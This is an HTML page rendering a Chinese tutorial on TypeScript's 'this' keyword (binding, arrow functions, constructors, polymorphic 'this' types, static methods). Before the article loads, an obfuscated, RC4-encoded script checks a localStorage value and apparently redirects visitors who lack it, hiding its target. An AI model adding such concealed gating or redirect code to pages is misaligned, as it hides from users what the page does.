<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x4cff(){var s=["DSkiW4CmW7X9W64VWP0zW61nyW","pmowWPVdHSooWPZdPJqeeCosaSkB","cSktFsnQw2PIqvDWtYa","W6JcJw5SW6tdHa3dOq","pSotWP/dGSobWP/dQHKhjCoAc8kT","s8kYW5FdKmktW7XwW4ZdTmkJWQq7W6S","ASk1rbqoW6ZdVq","AGneW7eDW5tcTc/dJCkgemkflGy+WRCWECojwH5mW7NcJthcGa","a8o0W5RcNSopW7LOWPeFte0MWRS","WOFcQ8kFzua","WRdcKmkiWP/dOYRdLqJcQuGOqmo+","WQL+svqaW43cHwtdJCk9WQb7WPq","bmotWPbyWR47WPCjWQW","WQddIeiWWO/cMCohWPyKlCo2iSoU","qMSInwyIDCoAkCkAW5XDiG","BCo8aSkPumk/W4tdUaaqeZxdKG","WQ/dVSklW7rVWPDDk8oOWP8SWRNdOa","D8keW4OmW7v+W6WQWOi5W6zWxq","cSkwW7WXW6eJrG","fceHW5WQWOBdIW","mYhdHSo3W6VcUCop","DSkeW4ijW7T/W6W8WQCaW5DguW"];return(_0x4cff=function(){return s})()}var _0x28c3d5=_0x295f;function _0x295f(t,s){var p=_0x4cff();return(_0x295f=function(s,n){var a=p[s-=115];void 0===_0x295f.gRAFVX&&(_0x295f.xdOhhW=function(s,n){var a,l=[],t=0,p="";for(s=(s=>{for(var n,a,l="",t="",p=0,e=0;a=s.charAt(e++);~a&&(n=p%4?64*n+a:a,p++%4)&&(l+=String.fromCharCode(255&n>>(-2*p&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,o=l.length;c<o;c++)t+="%"+("00"+l.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(t)})(s),e=0;e<256;e++)l[e]=e;for(e=0;e<256;e++)t=(t+l[e]+n.charCodeAt(e%n.length))%256,a=l[e],l[e]=l[t],l[t]=a;for(var e=0,t=0,c=0;c<s.length;c++)a=l[e=(e+1)%256],l[e]=l[t=(t+l[e])%256],l[t]=a,p+=String.fromCharCode(s.charCodeAt(c)^l[(l[e]+l[t])%256]);return p},t=arguments,_0x295f.gRAFVX=!0);var s=s+p[0],l=t[s];return l?a=l:(void 0===_0x295f.uhhiCU&&(_0x295f.uhhiCU=!0),a=_0x295f.xdOhhW(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x295f,n=_0x4cff();;)try{if(894920==+parseInt(s(122,"M*y9"))*(-parseInt(s(134,"G4Gv"))/2)+parseInt(s(115,"H!ah"))/3+parseInt(s(118,"SN6A"))/4+-parseInt(s(116,"vObj"))/5+parseInt(s(125,"RFrv"))/6+-parseInt(s(126,"rowk"))/7+-parseInt(s(135,"VCRz"))/8)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x28c3d5(130,"*@]Z")](_0x28c3d5(136,"bFk5"))!=_0x28c3d5(133,"930%"))throw window[_0x28c3d5(127,"gPFA")][_0x28c3d5(120,"@1Ez")](_0x28c3d5(131,"L!EV")),Error();document.title="TypeScript 中的this有什么需要注意的",document.getElementById("article").innerHTML='<div><p>在 TypeScript 中，<code>this</code> 关键字的行为与 JavaScript 类似，但由于 TypeScript 的静态类型系统，使用 <code>this</code> 时有一些需要特别注意的地方。以下是关于 TypeScript 中 <code>this</code> 的注意事项：</p>\n<hr>\n<h3><strong>1. <code>this</code> 的上下文绑定</strong></h3>\n<ul>\n<li><strong>动态绑定</strong>  ：<code>this</code> 的值是在运行时根据调用上下文动态绑定的，而不是在编写代码时确定的。</li>\n<li><strong>常见陷阱</strong>  ：在回调函数或事件处理器中，<code>this</code> 的值可能与预期不符。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;MyClass&quot;</span>;\n\n  <span class="hljs-title function_">printName</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);\n  }\n\n  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">const</span> callback = <span class="hljs-variable language_">this</span>.<span class="hljs-property">printName</span>;\n    <span class="hljs-comment">// callback(); // 错误：`this` 是 `undefined` 或指向全局对象（在严格模式下是 `undefined`）</span>\n\n    <span class="hljs-comment">// 正确的绑定方式</span>\n    <span class="hljs-keyword">const</span> boundCallback = <span class="hljs-variable language_">this</span>.<span class="hljs-property">printName</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);\n    <span class="hljs-title function_">boundCallback</span>(); <span class="hljs-comment">// 正确：`this` 指向 `MyClass` 实例</span>\n  }\n}\n</code></pre>\n<hr>\n<h3><strong>2. 使用箭头函数绑定 <code>this</code></strong></h3>\n<ul>\n<li><strong>箭头函数不创建自己的 <code>this</code></strong>  ：箭头函数会捕获其所在上下文的 <code>this</code> 值，而不是根据调用方式动态绑定。</li>\n<li><strong>适用场景</strong>  ：在类的方法中定义回调函数时，使用箭头函数可以避免显式绑定 <code>this</code>。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;MyClass&quot;</span>;\n\n  <span class="hljs-title function_">setup</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {\n      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>); <span class="hljs-comment">// 正确：`this` 指向 `MyClass` 实例</span>\n    }, <span class="hljs-number">1000</span>);\n  }\n}\n</code></pre>\n<hr>\n<h3><strong>3. 在构造函数中避免使用未初始化的 <code>this</code></strong></h3>\n<ul>\n<li><strong>初始化顺序</strong>  ：在构造函数中，<code>this</code> 的属性在超级构造函数调用之后才能安全使用。</li>\n<li><strong>潜在风险</strong>  ：在派生类的构造函数中，如果在超级构造函数调用之前访问 <code>this</code>，可能会导致错误。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Base constructor&quot;</span>);\n  }\n}\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Base</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;\n\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">super</span>(); <span class="hljs-comment">// 必须在访问 `this` 之前调用超级构造函数</span>\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">&quot;Derived&quot;</span>;\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);\n  }\n}\n</code></pre>\n<hr>\n<h3><strong>4. <code>this</code> 类型</strong></h3>\n<ul>\n<li><strong><code>this</code> 类型注解</strong>  ：在类的方法中，可以使用 <code>this</code> 类型注解来明确方法的返回类型是当前类的实例。</li>\n<li><strong>适用场景</strong>  ：在链式调用或流式接口中，确保方法返回 <code>this</code> 以支持链式调用。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FluentAPI</span> {\n  <span class="hljs-keyword">private</span> <span class="hljs-attr">value</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;\n\n  <span class="hljs-title function_">add</span>(<span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>): <span class="hljs-variable language_">this</span> {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> += amount;\n    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 返回 `this` 以支持链式调用</span>\n  }\n\n  <span class="hljs-title function_">subtract</span>(<span class="hljs-attr">amount</span>: <span class="hljs-built_in">number</span>): <span class="hljs-variable language_">this</span> {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> -= amount;\n    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;\n  }\n\n  <span class="hljs-title function_">getValue</span>(): <span class="hljs-built_in">number</span> {\n    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;\n  }\n}\n\n<span class="hljs-keyword">const</span> api = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FluentAPI</span>();\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(api.<span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>).<span class="hljs-title function_">subtract</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">getValue</span>()); <span class="hljs-comment">// 输出：3</span>\n</code></pre>\n<hr>\n<h3><strong>5. 静态上下文中的 <code>this</code></strong></h3>\n<ul>\n<li><strong>静态方法</strong>  ：在静态方法中，<code>this</code> 指向类的构造函数，而不是类的实例。</li>\n<li><strong>注意事项</strong>  ：不能在静态方法中访问实例属性和方法。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {\n  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === <span class="hljs-title class_">MyClass</span>); <span class="hljs-comment">// true</span>\n    <span class="hljs-comment">// console.log(this.name); // 错误：静态方法中不能访问实例属性</span>\n  }\n}\n\n<span class="hljs-title class_">MyClass</span>.<span class="hljs-title function_">staticMethod</span>();\n</code></pre>\n<hr>\n<h3><strong>6. 使用 <code>this</code> 类型在接口中</strong></h3>\n<ul>\n<li><strong>多态 <code>this</code> 类型</strong>  ：在接口中，可以使用 <code>this</code> 类型来定义返回当前实例类型的方法，支持多态行为。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Logger</span> {\n  <span class="hljs-title function_">log</span>(<span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>): <span class="hljs-variable language_">this</span>;\n}\n\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsoleLogger</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Logger</span> {\n  <span class="hljs-title function_">log</span>(<span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span>): <span class="hljs-variable language_">this</span> {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);\n    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;\n  }\n}\n\n<span class="hljs-keyword">const</span> logger = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConsoleLogger</span>();\nlogger.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello&quot;</span>).<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;World&quot;</span>); <span class="hljs-comment">// 链式调用</span>\n</code></pre>\n<hr>\n<h3><strong>7. 避免滥用 <code>this</code></strong></h3>\n<ul>\n<li><strong>可读性</strong>  ：过度使用 <code>this</code> 可能会降低代码的可读性，尤其是在方法内部频繁引用 <code>this</code> 时。</li>\n<li><strong>替代方案</strong>  ：在方法内部，可以使用局部变量来存储 <code>this</code> 的值，以提高可读性。</li>\n</ul>\n<h4><strong>示例</strong></h4>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span> {\n  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;MyClass&quot;</span>;\n\n  <span class="hljs-title function_">printNameWithThis</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);\n  }\n\n  <span class="hljs-title function_">printNameWithoutThis</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">const</span> self = <span class="hljs-variable language_">this</span>;\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(self.<span class="hljs-property">name</span>); <span class="hljs-comment">// 使用局部变量存储 `this`</span>\n  }\n}\n</code></pre>\n<hr>\n<h3><strong>总结</strong></h3>\n<ul>\n<li><strong><code>this</code> 的动态绑定</strong>  ：理解 <code>this</code> 是在运行时根据调用上下文动态绑定的。</li>\n<li><strong>箭头函数</strong>  ：使用箭头函数来捕获正确的 <code>this</code> 上下文。</li>\n<li><strong>构造函数</strong>  ：在构造函数中，确保在超级构造函数调用之后访问 <code>this</code>。</li>\n<li><strong><code>this</code> 类型注解</strong>  ：在类的方法中，使用 <code>this</code> 类型注解来支持链式调用。</li>\n<li><strong>静态上下文</strong>  ：在静态方法中，<code>this</code> 指向类的构造函数。</li>\n<li><strong>接口中的 <code>this</code> 类型</strong>  ：在接口中，使用 <code>this</code> 类型来定义返回当前实例类型的方法。</li>\n<li><strong>避免滥用</strong>  ：在方法内部，适度使用 <code>this</code>，以提高代码的可读性。</li>\n</ul>\n<p>通过理解这些注意事项，可以更好地掌握 TypeScript 中 <code>this</code> 的使用，避免常见的陷阱和错误。</p>\n</div>'</script></body></html>